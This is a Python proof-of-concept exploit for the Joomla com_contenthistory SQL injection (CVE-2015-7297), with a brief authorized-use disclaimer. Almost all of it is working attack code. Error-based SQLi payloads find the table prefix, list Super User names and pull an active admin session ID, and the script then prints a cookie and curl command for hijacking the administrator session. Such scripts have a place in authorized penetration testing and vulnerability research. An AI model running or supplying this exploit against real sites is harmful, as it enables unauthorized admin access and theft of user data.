# ==============================================================================
# Joomla Content History SQL Injection PoC Script
#
# This script exploits a known SQL Injection vulnerability in Joomla CMS versions
# 3.2 through 3.4.4 in the 'com_contenthistory' component.
#
# DISCLAIMER:
# This script is intended for authorized security testing and educational purposes only.
# Unauthorized access or exploitation of systems without explicit written permission is illegal
# and unethical. Use responsibly and within the boundaries of applicable laws and policies.
#
# Vulnerability Summary:
# The 'list[select]' parameter in the history view is vulnerable to error-based
# SQL injection. This allows attackers to extract sensitive data from the Joomla
# database, including admin usernames and active session IDs.
#
# Exploit Goal:
# - Auto-detect the Joomla database table prefix.
# - Enumerate Super User accounts.
# - Extract active administrator session IDs from the session table.
# - Detect the Joomla session cookie name dynamically.
# - Output a ready-to-use session cookie string to hijack the Joomla admin session.
#
# Usage:
# - Adjust the TARGET URL to point to the Joomla index.php frontend page.
# - Run with Python 3.
# - Use the extracted cookie in your browser or curl to access the Joomla admin panel.
#
# Attribution:
# This PoC was developed by KaotickJ, leveraging techniques for Joomla SQLi detection
# and session hijacking. The vulnerability is documented as CVE-2015-7297 and others.
#
# ==============================================================================




import requests
import re
from urllib.parse import urljoin

# === Configuration ===
TARGET = "http://10.0.2.13/joom330/index.php"  # <- Adjust as needed
TIMEOUT = 10
VERIFY_SSL = False

HEADERS = {
    "User-Agent": "Mozilla/5.0"
}

def sqli_error_payload(base_url, payload):
    """Perform error-based SQLi injection and return response body."""
    params = {
        "option": "com_contenthistory",
        "view": "history",
        "item_id": "1",
        "type_id": "1",
        "list[ordering]": "",
        "list[select]": payload
    }
    r = requests.get(base_url, params=params, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_SSL)
    return r.text


def detect_prefix(base_url):
    print("[*] Detecting Joomla table prefix...")
    payload = (
        "(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT 1), FLOOR(RAND(0)*2)) AS x "
        "FROM information_schema.tables GROUP BY x)a)"
    )
    response = sqli_error_payload(base_url, payload)
    match = re.search(r"FROM `([a-zA-Z0-9_]+)_ucm_history`", response)
    if match:
        prefix = match.group(1) + "_"
        print(f"[+] Detected prefix: {prefix}")
        return prefix
    else:
        print("[-] Could not detect table prefix.")
        return None


def extract_superusers(base_url, prefix):
    print(f"[*] Enumerating Super Users from {prefix}users")
    super_users = []
    for i in range(0, 10):
        payload = (
            f"(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM {prefix}users "
            f"WHERE id IN (SELECT user_id FROM {prefix}user_usergroup_map "
            f"WHERE group_id = 8) LIMIT {i},1), FLOOR(RAND(0)*2)) AS x "
            f"FROM information_schema.tables GROUP BY x) y)"
        )
        response = sqli_error_payload(base_url, payload)
        match = re.search(r"Duplicate entry '([^']+)' for key", response)
        if match:
            username = match.group(1)
            print(f"    [+] Super User: {username}")
            super_users.append(username)
        else:
            break
    return super_users


def extract_session_id(target_url, prefix):
    payload = (
        f"(SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT session_id "
        f"FROM {prefix}session WHERE userid != 0 AND data LIKE '%Super User%' "
        f"AND data NOT LIKE '%IS NOT NULL%' LIMIT 0,1), "
        f"FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x)a)"
    )
    params = {
        "option": "com_contenthistory",
        "view": "history",
        "item_id": "1",
        "type_id": "1",
        "list[ordering]": "",
        "list[select]": payload
    }
    try:
        r = requests.get(target_url, params=params, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_SSL)
        match = re.search(r"Duplicate entry '([^']+)' for key", r.text)
        if match:
            raw_session = match.group(1)
            # Remove the last character (random 0 or 1 appended by SQLi payload)
            session_id = raw_session[:-1]
            print(f"[+] Extracted session ID (cleaned): {session_id}")
            return session_id
    except Exception as e:
        print(f"[!] Error extracting session ID: {e}")
    print("[!] Failed to extract session ID")
    return None


def detect_cookie_name(target_url):
    try:
        admin_url = urljoin(target_url, "administrator/")
        r = requests.get(admin_url, headers=HEADERS, timeout=TIMEOUT, verify=VERIFY_SSL)
        for cookie in r.cookies:
            print(f"[+] Detected Joomla session cookie name: {cookie.name}")
            return cookie.name
    except Exception as e:
        print(f"[!] Error detecting cookie name: {e}")
    print("[!] Cookie name not found, defaulting to 'joomla_session'")
    return "joomla_session"


def main():
    print(f"\n[*] Target: {TARGET}")

    prefix = detect_prefix(TARGET)
    if not prefix:
        return

    super_users = extract_superusers(TARGET, prefix)
    if not super_users:
        print("[-] No Super Users found.")
        return

    session_id = extract_session_id(TARGET, prefix)
    if not session_id:
        return

    cookie_name = detect_cookie_name(TARGET)

    print("\n[+] Use the following cookie to hijack the admin session:\n")
    print(f"    {cookie_name}={session_id}")
    print("\n[*] Paste this into your browser devtools (Storage > Cookies) or use in curl like:\n")
    print(f"    curl -b '{cookie_name}={session_id}' {TARGET.replace('index.php', 'administrator/')}\n")


if __name__ == "__main__":
    main()
